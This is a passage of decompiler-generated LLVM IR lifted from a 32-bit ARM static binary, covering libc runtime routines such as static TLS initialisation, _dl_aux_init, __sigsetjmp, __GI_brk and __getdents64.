  %v1_171c8 = load i32, i32* %sb.global-to-local, align 4
  %v2_171c8 = add i32 %v1_171c8, %v0_171c8
  store i32 %v2_171c8, i32* @ip, align 4
  %v0_171cc = load i32, i32* %sl.global-to-local, align 4
  %v1_171cc = load i32, i32* %r4.global-to-local, align 4
  %v2_171cc = add i32 %v1_171cc, %v0_171cc
  store i32 %v2_171cc, i32* %r4.global-to-local, align 4
  %v2_171d0 = add i32 %v0_171cc, 11520
  store i32 %v2_171d0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_171c8, i32* @r0, align 4
  %v2_171e4 = add i32 %v2_171cc, 16
  %v3_171e4 = inttoptr i32 %v2_171e4 to i32*
  store i32 %v2_171c8, i32* %v3_171e4, align 4
  %v0_171e8 = load i32, i32* %sb.global-to-local, align 4
  %v1_171e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_171e8 = add i32 %v1_171e8, 40
  %v3_171e8 = inttoptr i32 %v2_171e8 to i32*
  store i32 %v0_171e8, i32* %v3_171e8, align 4
  %v0_171ec = load i32, i32* @r3, align 4
  %v1_171ec = trunc i32 %v0_171ec to i8
  %v2_171ec = load i32, i32* %r4.global-to-local, align 4
  %v3_171ec = add i32 %v2_171ec, 20
  %v4_171ec = inttoptr i32 %v3_171ec to i8*
  store i8 %v1_171ec, i8* %v4_171ec, align 1
  %v0_171f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_171f0 = add i32 %v0_171f0, 8
  store i32 %v1_171f0, i32* @r4, align 4
  %v0_171f4 = call i32 @memcpy()
  %v0_171fc = load i32, i32* @r4, align 4
  %v1_171fc = load i32, i32* @r5, align 4
  %v2_171fc = inttoptr i32 %v1_171fc to i32*
  store i32 %v0_171fc, i32* %v2_171fc, align 4
  %v0_17200 = load i32, i32* @r5, align 4
  store i32 %v0_17200, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17200, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_12af0.529 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17214 = load i32, i32* %sl.global-to-local, align 4
  %v2_17214 = add i32 %v0_17214, 84
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  %v4_17214 = load i32, i32* %v3_17214, align 4
  store i32 %v4_17214, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10744, i32* %r1.global-to-local, align 4
  %v2_17220 = add i32 %v0_17214, 60
  %v3_17220 = inttoptr i32 %v2_17220 to i32*
  %v4_17220 = load i32, i32* %v3_17220, align 4
  store i32 %v4_17220, i32* %r0.global-to-local, align 4
  %v3_17228 = add i32 %v0_17214, 10744
  %v4_17228 = inttoptr i32 %v3_17228 to i32*
  store i32 64, i32* %v4_17228, align 4
  %v1_17230 = load i32, i32* %r8.global-to-local, align 4
  %v2_17230 = add i32 %v1_17230, 20
  %v3_17230 = inttoptr i32 %v2_17230 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17230, align 4
  %v1_17238 = load i32, i32* %r8.global-to-local, align 4
  %v2_17238 = add i32 %v1_17238, 24
  %v3_17238 = inttoptr i32 %v2_17238 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17238, align 4
  %v1_17240 = load i32, i32* %r0.global-to-local, align 4
  %v2_17240 = inttoptr i32 %v1_17240 to i32*
  store i32 1, i32* %v2_17240, align 4
  %v1_17248 = load i32, i32* %r8.global-to-local, align 4
  %v2_17248 = add i32 %v1_17248, 28
  %v3_17248 = inttoptr i32 %v2_17248 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17248, align 4
  %v0_17250 = load i32, i32* @r6, align 4
  %v2_17250 = icmp eq i32 %v0_17250, 0
  %v1_17254 = load i32, i32* %r8.global-to-local, align 4
  %v2_17254 = add i32 %v1_17254, 44
  %v3_17254 = inttoptr i32 %v2_17254 to i32*
  store i32 1, i32* %v3_17254, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1725c = load i32, i32* %sl.global-to-local, align 4
  %v1_1725c = load i32, i32* %r1.global-to-local, align 4
  %v2_1725c = add i32 %v1_1725c, %v0_1725c
  store i32 %v2_1725c, i32* %r2.global-to-local, align 4
  %v1_17260 = load i32, i32* @r6, align 4
  br i1 %v2_17250, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17174
  store i32 %v1_17260, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1726c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_1726c35 = add i32 %v1_1726c34, 32
  %v3_1726c36 = inttoptr i32 %v2_1726c35 to i32*
  store i32 %v1_17260, i32* %v3_1726c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17174
  %v2_17264 = add i32 %v1_17260, -1
  store i32 %v2_17264, i32* %r0.global-to-local, align 4
  %v1_1726c = load i32, i32* %r8.global-to-local, align 4
  %v2_1726c = add i32 %v1_1726c, 32
  %v3_1726c = inttoptr i32 %v2_1726c to i32*
  store i32 %v1_17260, i32* %v3_1726c, align 4
  %v1_17270 = load i32, i32* @r6, align 4
  store i32 %v1_17270, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17274 = load i32, i32* %r8.global-to-local, align 4
  %v1_17274 = load i32, i32* %r2.global-to-local, align 4
  %v2_17274 = add i32 %v1_17274, 28
  %v3_17274 = inttoptr i32 %v2_17274 to i32*
  store i32 %v0_17274, i32* %v3_17274, align 4
  %v0_17278 = load i32, i32* %r2.global-to-local, align 4
  %v1_17278 = load i32, i32* %ip.global-to-local, align 4
  %v2_17278 = inttoptr i32 %v1_17278 to i32*
  store i32 %v0_17278, i32* %v2_17278, align 4
  %v0_1727c = load i32, i32* %r0.global-to-local, align 4
  %v1_1727c = load i32, i32* %r3.global-to-local, align 4
  %v2_1727c = add i32 %v1_1727c, %v0_1727c
  store i32 %v2_1727c, i32* %r0.global-to-local, align 4
  %v1_17280 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17250, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17288.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17288 = phi i32 [ %v0_17288.pre, %._crit_edge ], [ %v1_17280, %bb54 ]
  %v2_17284 = udiv i32 %v2_1727c, %v1_17280
  %v2_17288 = load i32, i32* %sb.global-to-local, align 4
  %v3_17288 = mul i32 %v2_17284, %v0_17288
  %v4_17288 = add i32 %v2_17288, %v3_17288
  store i32 %v4_17288, i32* @r0, align 4
  %v0_1728c = load i32, i32* %fp.global-to-local, align 4
  %v2_1728c = icmp ult i32 %v0_1728c, 16
  %v0_1728c. = select i1 %v2_1728c, i32 16, i32 %v0_1728c
  store i32 %v0_1728c., i32* @r1, align 4
  %v2_1729c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1729c, i32* @r4, align 4
  store i32 %v6_170b8, i32* @r5, align 4
  store i32 %v15_170b8, i32* %r8.global-to-local, align 4
  store i32 %v18_170b8, i32* %sb.global-to-local, align 4
  store i32 %v21_170b8, i32* %sl.global-to-local, align 4
  store i32 %v24_170b8, i32* %fp.global-to-local, align 4
  store i32 %v27_170b8, i32* @lr, align 4
  %v0_172a0 = call i32 @init_static_tls()
  store i32 %v0_172a0, i32* %r0.global-to-local, align 4
  %v0_172ac.pre = load i32, i32* @ip, align 4
  %v1_17174.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17184.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_172a4

dec_label_pc_17130.dec_label_pc_172a4.loopexit_crit_edge: ; preds = %dec_label_pc_1712c
  br label %dec_label_pc_172a4.loopexit

dec_label_pc_172a4.loopexit:                      ; preds = %dec_label_pc_17130.dec_label_pc_172a4.loopexit_crit_edge, %dec_label_pc_170e4
  br label %dec_label_pc_172a4

dec_label_pc_172a4:                               ; preds = %dec_label_pc_172a4.loopexit, %entry, %bb55
  %v0_17184.pre.pre = phi i32 [ ptrtoint (i32* @global_var_214b8.340 to i32), %dec_label_pc_172a4.loopexit ], [ ptrtoint (i32* @global_var_214b8.340 to i32), %entry ], [ %v0_17184.pre.pre.pre, %bb55 ]
  %v1_17174.pre.pre = phi i32 [ %v0_170d8, %dec_label_pc_172a4.loopexit ], [ %v0_170d8, %entry ], [ %v1_17174.pre.pre.pre, %bb55 ]
  %v0_172ac = phi i32 [ %v0_170dc, %dec_label_pc_172a4.loopexit ], [ %v0_170dc, %entry ], [ %v0_172ac.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_172ac, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17170

; uselistorder directives
  uselistorder i32 %v0_172ac, { 1, 0 }
  uselistorder i32 %v1_17260, { 1, 0, 2, 3 }
  uselistorder i32 %v0_171cc, { 1, 0 }
  uselistorder i32 %v2_171c8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1712c, { 2, 1, 0 }
  uselistorder i32 %v3_17104, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1710c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17130, { 1, 0 }
  uselistorder i32 %v0_170dc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_170d8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_170cc, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10744, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_172a4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17174, { 1, 0 }
  uselistorder label %dec_label_pc_17170, { 1, 0 }
  uselistorder label %dec_label_pc_170f4, { 1, 0 }
}

define i32 @function_172c4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_172c4:
  %v0_172c4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_172c4, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_172c4
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_172c4
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_172f0 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_172f0
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r2.global-to-local, align 4
  %v4_17300 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 156) to i32*), align 4
  %v4_17308 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 104) to i32*), align 4
  store i32 %v4_17308, i32* %r1.global-to-local, align 4
  %v1_1730c = add i32 %arg1, 44
  %v2_1730c = inttoptr i32 %v1_1730c to i32*
  %v3_1730c = load i32, i32* %v2_1730c, align 4
  %v1_17310 = add i32 %arg1, 28
  %v2_17310 = inttoptr i32 %v1_17310 to i32*
  %v3_17310 = load i32, i32* %v2_17310, align 4
  store i32 %v3_17310, i32* %r2.global-to-local, align 4
  %v2_17314 = inttoptr i32 %v4_17300 to i32*
  store i32 %v3_1730c, i32* %v2_17314, align 4
  %v0_17318 = load i32, i32* %r2.global-to-local, align 4
  %v1_17318 = load i32, i32* %r1.global-to-local, align 4
  %v2_17318 = inttoptr i32 %v1_17318 to i32*
  store i32 %v0_17318, i32* %v2_17318, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17324(i32 %arg1) local_unnamed_addr {
dec_label_pc_17324:
  %v0_17324 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17324, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17324
  %v1_17324 = load i32, i32* @ip, align 4
  %v3_17324 = mul i32 %v1_17324, %arg1
  %v2_17328 = load i32, i32* @r8, align 4
  %v4_17328 = and i32 %v2_17328, %v3_17324
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17324, %bb
  %v5_17328 = phi i32 [ %arg1, %dec_label_pc_17324 ], [ %v4_17328, %bb ]
  ret i32 %v5_17328

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17334 = add i32 %arg1, 40
  store i32 %v1_17334, i32* %r2.global-to-local, align 4
  %v1_17338 = inttoptr i32 %v1_17334 to i32*
  %v2_17338 = load i32, i32* %v1_17338, align 4
  store i32 %v2_17338, i32* %r2.global-to-local, align 4
  %v3_17338 = add i32 %arg1, 44
  %v4_17338 = inttoptr i32 %v3_17338 to i32*
  %v5_17338 = load i32, i32* %v4_17338, align 4
  store i32 %v5_17338, i32* %r3.global-to-local, align 4
  %v0_1733c = call i32 @__aeabi_read_tp()
  %v1_17340 = inttoptr i32 %v0_1733c to i32*
  %v2_17340 = load i32, i32* %v1_17340, align 4
  store i32 %v2_17340, i32* %r1.global-to-local, align 4
  %v3_17344 = mul i32 %v5_17338, 8
  store i32 %v3_17344, i32* %r3.global-to-local, align 4
  %v1_17348 = load i32, i32* %r2.global-to-local, align 4
  %v2_17348 = add i32 %v1_17348, %v0_1733c
  %v3_1734c = add i32 %v3_17344, %v2_17340
  %v4_1734c = inttoptr i32 %v3_1734c to i32*
  store i32 %v2_17348, i32* %v4_1734c, align 4
  %v0_17350 = load i32, i32* %r3.global-to-local, align 4
  %v1_17350 = load i32, i32* %r1.global-to-local, align 4
  %v2_17350 = add i32 %v1_17350, %v0_17350
  store i32 %v2_17350, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17358 = add i32 %v2_17350, 4
  %v5_17358 = inttoptr i32 %v4_17358 to i8*
  store i8 1, i8* %v5_17358, align 1
  %v0_1735c = load i32, i32* @r4, align 4
  %v1_1735c = add i32 %v0_1735c, 20
  store i32 %v1_1735c, i32* %r1.global-to-local, align 4
  %v1_17360 = inttoptr i32 %v1_1735c to i32*
  %v2_17360 = load i32, i32* %v1_17360, align 4
  store i32 %v2_17360, i32* @r1, align 4
  %v3_17360 = add i32 %v0_1735c, 24
  %v4_17360 = inttoptr i32 %v3_17360 to i32*
  %v5_17360 = load i32, i32* %v4_17360, align 4
  store i32 %v5_17360, i32* %r2.global-to-local, align 4
  %v5_17364 = call i32 @__GI_mempcpy(i32 %v2_17348, i32 %v2_17360, i32 %v5_17360, i32 1)
  %v0_17368 = load i32, i32* @r4, align 4
  %v1_17368 = add i32 %v0_17368, 28
  store i32 %v1_17368, i32* %r3.global-to-local, align 4
  %v1_1736c = inttoptr i32 %v1_17368 to i32*
  %v2_1736c = load i32, i32* %v1_1736c, align 4
  store i32 %v2_1736c, i32* %r2.global-to-local, align 4
  %v3_1736c = add i32 %v0_17368, 24
  %v4_1736c = inttoptr i32 %v3_1736c to i32*
  %v5_1736c = load i32, i32* %v4_1736c, align 4
  store i32 %v5_1736c, i32* %r3.global-to-local, align 4
  %v2_17370 = sub i32 %v5_1736c, %v2_1736c
  store i32 %v2_17370, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17378 = inttoptr i32 %v5_17364 to i8*
  %v4_17378 = call i32 @__GI_memset(i8* %v3_17378, i32 0, i32 %v2_17370)
  ret i32 %v4_17378

; uselistorder directives
  uselistorder i32 %v3_17344, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_173c8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 11572) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_173dc = load i32, i32* @r0, align 4
  %v1_173e0 = inttoptr i32 %v0_173dc to i32*
  %v2_173e0 = load i32, i32* @r4, align 4
  store i32 %v2_173e0, i32* %v1_173e0, align 4
  %v3_173e0 = add i32 %v0_173dc, 4
  %v4_173e0 = inttoptr i32 %v3_173e0 to i32*
  %v5_173e0 = load i32, i32* @r5, align 4
  store i32 %v5_173e0, i32* %v4_173e0, align 4
  %v6_173e0 = add i32 %v0_173dc, 8
  %v7_173e0 = inttoptr i32 %v6_173e0 to i32*
  %v8_173e0 = load i32, i32* @r6, align 4
  store i32 %v8_173e0, i32* %v7_173e0, align 4
  %v9_173e0 = add i32 %v0_173dc, 12
  %v10_173e0 = inttoptr i32 %v9_173e0 to i32*
  %v11_173e0 = load i32, i32* @r7, align 4
  store i32 %v11_173e0, i32* %v10_173e0, align 4
  %v12_173e0 = add i32 %v0_173dc, 16
  %v13_173e0 = inttoptr i32 %v12_173e0 to i32*
  %v14_173e0 = load i32, i32* @r8, align 4
  store i32 %v14_173e0, i32* %v13_173e0, align 4
  %v15_173e0 = add i32 %v0_173dc, 20
  %v16_173e0 = inttoptr i32 %v15_173e0 to i32*
  %v17_173e0 = load i32, i32* @sb, align 4
  store i32 %v17_173e0, i32* %v16_173e0, align 4
  %v18_173e0 = add i32 %v0_173dc, 24
  %v19_173e0 = inttoptr i32 %v18_173e0 to i32*
  %v20_173e0 = load i32, i32* @sl, align 4
  store i32 %v20_173e0, i32* %v19_173e0, align 4
  %v21_173e0 = add i32 %v0_173dc, 28
  %v22_173e0 = inttoptr i32 %v21_173e0 to i32*
  %v23_173e0 = load i32, i32* @fp, align 4
  store i32 %v23_173e0, i32* %v22_173e0, align 4
  %v24_173e0 = add i32 %v0_173dc, 32
  %v25_173e0 = inttoptr i32 %v24_173e0 to i32*
  %v27_173e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_173e0, i32* %v25_173e0, align 4
  %v28_173e0 = add i32 %v0_173dc, 36
  %v29_173e0 = inttoptr i32 %v28_173e0 to i32*
  %v30_173e0 = load i32, i32* @lr, align 4
  store i32 %v30_173e0, i32* %v29_173e0, align 4
  %v0_173e4 = call i32 @__sigjmp_save()
  ret i32 %v0_173e4

; uselistorder directives
  uselistorder i32 %v0_173dc, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 92, 93, 6, 7, 8, 9, 10, 11, 12, 13, 80, 81, 82, 83, 84, 86, 85, 87, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 2, 3, 4, 5, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 73, 71, 72, 74, 75, 78, 76, 77, 79, 88, 89, 90, 91, 94 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_173ec = load i32, i32* @r5, align 4
  %v12_173ec = load i32, i32* @r7, align 4
  %v1_173f0 = add i32 %arg3, 14
  %v2_173f8 = ptrtoint i32* %stack_var_-72 to i32
  %v1_173fc = and i32 %v1_173f0, -8
  %v2_17400 = sub i32 %v2_173f8, %v1_173fc
  %v1_17404 = add i32 %v2_17400, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17448, label %dec_label_pc_1742c

dec_label_pc_1742c:                               ; preds = %entry
  %v1_17430 = sub i32 0, %arg1
  %v3_17434 = load i16, i16* @global_var_21510.336, align 2
  %v4_17434 = sext i16 %v3_17434 to i32
  %v0_17438 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17440 = add i32 %v4_17434, %v0_17438
  %v4_17440 = inttoptr i32 %v3_17440 to i32*
  store i32 %v1_17430, i32* %v4_17440, align 4
  br label %dec_label_pc_17518

dec_label_pc_17448:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17518, label %dec_label_pc_17450

dec_label_pc_17450:                               ; preds = %dec_label_pc_17448
  %v2_17450 = add i32 %v1_17404, %arg1
  store i32 %v2_17450, i32* %r1.global-to-local, align 4
  %v2_17454 = add i32 %tmp, %arg3
  store i32 %v1_17404, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17500

dec_label_pc_17470:                               ; preds = %dec_label_pc_17500
  %v1_17470 = add i32 %v0_174d0, 16
  %v2_17470 = inttoptr i32 %v1_17470 to i16*
  %v3_17470 = load i16, i16* %v2_17470, align 2
  %v4_17470 = zext i16 %v3_17470 to i32
  %v1_17474 = add nsw i32 %v4_17470, -19
  store i32 %v1_17474, i32* @r2, align 4
  %v1_17478 = add nuw nsw i32 %v4_17470, 7
  %v1_1747c = and i32 %v1_17478, 131064
  store i32 %v1_1747c, i32* @ip, align 4
  %v2_17484 = add i32 %v1_1747c, %v0_174d8
  store i32 %v2_17484, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17484, %v2_17454
  br i1 %tmp24, label %dec_label_pc_17490, label %dec_label_pc_174cc

dec_label_pc_17490:                               ; preds = %dec_label_pc_17470
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17498 = load i32, i32* %r8.global-to-local, align 4
  %v0_1749c = load i32, i32* %sb.global-to-local, align 4
  %v1_174a0 = load i32, i32* @sp, align 4
  %v2_174a0 = inttoptr i32 %v1_174a0 to i32*
  store i32 0, i32* %v2_174a0, align 4
  %v4_174a4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17498, i32 %v0_1749c)
  %v0_174a8 = load i32, i32* @r5, align 4
  %v1_174a8 = load i32, i32* %sl.global-to-local, align 4
  %v9_174a8 = icmp eq i32 %v0_174a8, %v1_174a8
  br i1 %v9_174a8, label %dec_label_pc_174b0, label %dec_label_pc_17514

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17490
  %v0_174b4 = call i32 @__aeabi_read_tp()
  %v3_174b8 = load i16, i16* @global_var_21510.336, align 2
  %v4_174b8 = sext i16 %v3_174b8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_174c4 = add i32 %v4_174b8, %v0_174b4
  %v4_174c4 = inttoptr i32 %v3_174c4 to i32*
  store i32 22, i32* %v4_174c4, align 4
  br label %dec_label_pc_17518

dec_label_pc_174cc:                               ; preds = %dec_label_pc_17470
  %v1_174cc = inttoptr i32 %v0_174d0 to i32*
  %v2_174cc = load i32, i32* %v1_174cc, align 4
  %v3_174cc = add i32 %v0_174d0, 4
  %v4_174cc = inttoptr i32 %v3_174cc to i32*
  %v5_174cc = load i32, i32* %v4_174cc, align 4
  store i32 %v5_174cc, i32* @r4, align 4
  %v1_174d0 = add i32 %v0_174d0, 8
  store i32 %v1_174d0, i32* %r8.global-to-local, align 4
  %v1_174d4 = inttoptr i32 %v1_174d0 to i32*
  %v2_174d4 = load i32, i32* %v1_174d4, align 4
  store i32 %v2_174d4, i32* %r8.global-to-local, align 4
  %v3_174d4 = add i32 %v0_174d0, 12
  %v4_174d4 = inttoptr i32 %v3_174d4 to i32*
  %v5_174d4 = load i32, i32* %v4_174d4, align 4
  store i32 %v5_174d4, i32* %sb.global-to-local, align 4
  %v1_174d8 = inttoptr i32 %v0_174d8 to i32*
  store i32 %v2_174cc, i32* %v1_174d8, align 4
  %v3_174d8 = add i32 %v0_174d8, 4
  %v4_174d8 = inttoptr i32 %v3_174d8 to i32*
  %v5_174d8 = load i32, i32* @r4, align 4
  store i32 %v5_174d8, i32* %v4_174d8, align 4
  %v0_174dc = load i32, i32* %r8.global-to-local, align 4
  %v1_174dc = load i32, i32* @r5, align 4
  %v2_174dc = add i32 %v1_174dc, 8
  %v3_174dc = inttoptr i32 %v2_174dc to i32*
  store i32 %v0_174dc, i32* %v3_174dc, align 4
  %v0_174e0 = load i32, i32* %sb.global-to-local, align 4
  %v1_174e0 = load i32, i32* @r5, align 4
  %v2_174e0 = add i32 %v1_174e0, 12
  %v3_174e0 = inttoptr i32 %v2_174e0 to i32*
  store i32 %v0_174e0, i32* %v3_174e0, align 4
  %v0_174e4 = load i32, i32* @ip, align 4
  %v1_174e4 = trunc i32 %v0_174e4 to i16
  %v2_174e4 = load i32, i32* @r5, align 4
  %v3_174e4 = add i32 %v2_174e4, 16
  %v4_174e4 = inttoptr i32 %v3_174e4 to i16*
  store i16 %v1_174e4, i16* %v4_174e4, align 2
  %v0_174e8 = load i32, i32* @r7, align 4
  %v1_174e8 = add i32 %v0_174e8, 18
  %v2_174e8 = inttoptr i32 %v1_174e8 to i8*
  %v3_174e8 = load i8, i8* %v2_174e8, align 1
  %v4_174e8 = zext i8 %v3_174e8 to i32
  store i32 %v4_174e8, i32* @r3, align 4
  %v2_174ec = load i32, i32* @r5, align 4
  %v3_174ec = add i32 %v2_174ec, 18
  %v4_174ec = inttoptr i32 %v3_174ec to i8*
  store i8 %v3_174e8, i8* %v4_174ec, align 1
  %v0_174f0 = call i32 @memcpy()
  %v0_174f4 = load i32, i32* @r7, align 4
  %v1_174f4 = add i32 %v0_174f4, 16
  %v2_174f4 = inttoptr i32 %v1_174f4 to i16*
  %v3_174f4 = load i16, i16* %v2_174f4, align 2
  %v4_174f4 = zext i16 %v3_174f4 to i32
  %v0_174f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_174f8, i32* @r5, align 4
  %v2_174fc = add i32 %v4_174f4, %v0_174f4
  store i32 %v2_174fc, i32* @r7, align 4
  br label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_17450, %dec_label_pc_174cc
  %v0_174d8 = phi i32 [ %tmp, %dec_label_pc_17450 ], [ %v0_174f8, %dec_label_pc_174cc ]
  %v0_174d0 = phi i32 [ %v1_17404, %dec_label_pc_17450 ], [ %v2_174fc, %dec_label_pc_174cc ]
  %v3_17504 = icmp ult i32 %v0_174d0, %v2_17450
  %v1_17508 = add i32 %v0_174d8, 19
  store i32 %v1_17508, i32* @r0, align 4
  %v1_1750c = add i32 %v0_174d0, 19
  store i32 %v1_1750c, i32* @r1, align 4
  br i1 %v3_17504, label %dec_label_pc_17470, label %dec_label_pc_17514.loopexit

dec_label_pc_17514.loopexit:                      ; preds = %dec_label_pc_17500
  %v0_17514.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17514

dec_label_pc_17514:                               ; preds = %dec_label_pc_17514.loopexit, %dec_label_pc_17490
  %v1_17514 = phi i32 [ %v0_174d8, %dec_label_pc_17514.loopexit ], [ %v0_174a8, %dec_label_pc_17490 ]
  %v0_17514 = phi i32 [ %v0_17514.pre, %dec_label_pc_17514.loopexit ], [ %v1_174a8, %dec_label_pc_17490 ]
  %v2_17514 = sub i32 %v1_17514, %v0_17514
  store i32 %v2_17514, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_17448, %dec_label_pc_174b0, %dec_label_pc_1742c, %dec_label_pc_17514
  %v0_17518 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_173ec, i32* @r5, align 4
